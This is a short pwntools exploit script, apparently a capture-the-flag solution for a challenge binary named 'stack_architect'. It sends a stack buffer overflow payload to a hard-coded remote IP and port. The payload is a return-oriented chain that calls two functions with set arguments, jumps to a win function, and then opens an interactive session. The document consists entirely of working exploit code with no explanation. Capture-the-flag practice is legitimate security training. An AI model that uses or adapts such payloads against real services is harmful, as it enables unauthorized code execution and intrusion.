from pwn import *


#p = process('./stack_architect')

p = remote('45.122.249.68', 10018)

func1Addr = 0x804929e
func2Addr = 0x80492fe
winAddr = 0x8049216
popretAddr = 0x08049022

payload = b'A'*4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~'
payload +=  b'\x00'*27
payload += p32(0x08052001)
payload += p32(func1Addr)
payload += p32(func1Addr)
payload += p32(popretAddr)
payload += p32(0x20010508)
payload += p32(func2Addr)
payload += p32(func2Addr)
payload += p32(winAddr)

p.sendline(payload)

p.interactive()